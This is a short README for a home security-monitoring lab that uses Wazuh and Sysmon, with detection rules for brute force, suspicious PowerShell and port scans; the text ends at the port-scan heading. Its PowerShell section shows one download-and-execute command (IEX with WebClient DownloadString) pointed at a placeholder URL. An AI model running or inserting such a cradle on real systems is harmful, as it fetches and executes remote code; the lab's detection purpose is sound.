# Mini SOC Lab – Wazuh + Sysmon

## Overview

This project demonstrates the creation of a small Security Operations Center (SOC) laboratory using **Wazuh SIEM**, **Sysmon**, and **Windows telemetry**.

The lab simulates attacker activity from a Kali Linux machine against a monitored Windows host and detects suspicious behavior using custom detection rules.

---

## Architecture

Kali Linux (Attacker)
↓
Windows 10 (Victim)
↓
Sysmon + Windows Event Logs
↓
Wazuh Agent
↓
Wazuh Manager / SIEM
↓
Custom Detection Rules
↓
Security Alerts

---

## Tools Used

- Wazuh SIEM
- Sysmon
- Windows Event Logs
- Kali Linux
- Nmap

---

## Implemented Detections

| Attack | Telemetry | Detection Rule |
|------|------|------|
| Brute Force | Windows Event ID 4625 | Rule 100201 |
| Suspicious PowerShell Execution | Sysmon Event ID 1 | Rule 100302 |
| Port Scan | Sysmon Event ID 3 | Rule 100401 |

## Attack Simulation

### Brute Force

Multiple failed login attempts were generated to simulate a brute-force attack.

### Suspicious PowerShell

Example command used:
powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://test´)"


### Port Scan
